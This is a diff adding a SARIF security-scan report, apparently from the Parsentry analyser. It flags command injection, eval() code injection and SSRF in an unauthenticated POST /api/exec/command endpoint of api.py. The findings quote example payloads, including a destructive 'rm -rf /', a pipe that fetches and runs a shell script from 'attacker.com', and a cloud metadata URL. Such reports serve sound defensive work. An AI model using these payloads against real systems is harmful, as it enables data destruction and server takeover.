@@ -1,0 +1,162 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Parsentry",
+          "version": "0.14.0",
+          "informationUri": "https://github.com/HikaruEgashira/parsentry",
+          "rules": [
+            {
+              "id": "RCE-CMD-INJECTION",
+              "name": "OSCommandInjection",
+              "shortDescription": {
+                "text": "OS command injection via subprocess.run with shell=True"
+              },
+              "fullDescription": {
+                "text": "Attacker-controlled input is passed directly to subprocess.run() with shell=True, enabling arbitrary OS command execution. Shell metacharacters (;, |, &&, ||, $()) are interpreted, allowing command chaining and substitution."
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/78.html",
+              "properties": {
+                "tags": ["security", "CWE-78", "OWASP-A03:2021"]
+              }
+            },
+            {
+              "id": "RCE-CODE-EVAL",
+              "name": "CodeInjectionViaEval",
+              "shortDescription": {
+                "text": "Arbitrary code execution via eval() on untrusted input"
+              },
+              "fullDescription": {
+                "text": "User-supplied input from HTTP request body is passed directly to Python's eval() function without any validation, sanitization, or sandboxing. This allows execution of arbitrary Python code on the server."
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/94.html",
+              "properties": {
+                "tags": ["security", "CWE-94", "OWASP-A03:2021"]
+              }
+            },
+            {
+              "id": "SSRF",
+              "name": "ServerSideRequestForgery",
+              "shortDescription": {
+                "text": "Server-side request forgery via unvalidated URL in requests.get"
+              },
+              "fullDescription": {
+                "text": "User-controlled URL is passed to requests.get() without validation of the target host or scheme, allowing attackers to access internal services, cloud metadata endpoints, or other restricted resources."
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/918.html",
+              "properties": {
+                "tags": ["security", "CWE-918", "OWASP-A10:2021"]
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "RCE-CMD-INJECTION",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "OS command injection: The 'command' field from the JSON request body is passed directly to subprocess.run() with shell=True at line 186. No input validation, sanitization, or command whitelisting is applied. An attacker can execute arbitrary OS commands by injecting shell metacharacters (e.g., '; rm -rf /', '| curl attacker.com/shell.sh | bash')."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "api.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 186,
+                  "endLine": 195
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.99,
+            "surface-id": "SURFACE-007",
+            "par-analysis": {
+              "principal": "External HTTP client (unauthenticated POST request)",
+              "action": "No input validation, no sanitization, no allowlist, no sandboxing",
+              "resource": "OS command execution via subprocess.run(shell=True)"
+            }
+          }
+        },
+        {
+          "ruleId": "RCE-CODE-EVAL",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "Arbitrary code execution: User-supplied 'code' parameter from JSON request body is passed directly to Python eval() without any validation or sandboxing. An attacker can execute arbitrary Python code, including __import__('os').system('...') for OS-level access."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "api.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 0
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 1.0,
+            "surface-id": "SURFACE-007",
+            "par-analysis": {
+              "principal": "External HTTP client (unauthenticated POST request)",
+              "action": "No input validation, no AST restriction, no sandboxing",
+              "resource": "Python eval() - arbitrary code execution"
+            }
+          }
+        },
+        {
+          "ruleId": "SSRF",
+          "ruleIndex": 2,
+          "level": "error",
+          "message": {
+            "text": "Server-side request forgery: User-controlled URL is passed to requests.get() without host/scheme validation. Attackers can probe internal services (e.g., http://169.254.169.254/latest/meta-data/ for cloud metadata), access localhost-bound services, or perform port scanning of internal networks."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "api.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 0
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.9,
+            "surface-id": "SURFACE-007",
+            "par-analysis": {
+              "principal": "External HTTP client",
+              "action": "No URL scheme/host validation, no allowlist, no egress filtering",
+              "resource": "HTTP client (requests.get) with server-side network access"
+            }
+          }
+        }
+      ],
+      "invocations": [
+        {
+          "executionSuccessful": true,
+          "properties": {
+            "surface-id": "SURFACE-007",
+            "surface-kind": "endpoint",
+            "surface-identifier": "POST /api/exec/command"
+          }
+        }
+      ]
+    }
+  ]
+}
